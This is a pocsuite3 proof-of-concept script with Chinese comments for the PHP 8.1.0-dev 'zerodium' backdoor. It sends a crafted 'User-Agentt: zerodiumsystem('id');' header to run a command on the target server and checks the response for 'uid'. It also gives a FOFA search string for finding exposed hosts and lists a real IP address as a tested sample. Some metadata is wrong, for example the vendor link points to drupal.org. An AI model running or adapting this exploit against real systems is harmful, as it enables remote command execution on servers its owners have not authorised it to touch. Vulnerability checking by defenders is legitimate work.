from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class zerodiumPOC(POCBase):
    # fofa语句: "PHP/8.1.0-dev"
    vulID = "PHP zerodium后门漏洞"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2022-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/language/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = "PHP zerodium后门漏洞_poc"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "PHP zerodium后门漏洞"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://13.127.51.170:8080 "]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """PHP zerodium后门漏洞"""  # 漏洞简要描述
    pocDesc = """User-Agentt: zerodiumsystem('id');"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "User-Agentt": "zerodiumsystem('id');", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip()   # self.url 就是你指定的-u 参数的值
            response = requests.get(url=url, headers=headers,  allow_redirects=False, verify=False,
                                    timeout=5)
            if "uid" in response.text and response.status_code == 200:
                result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(zerodiumPOC)
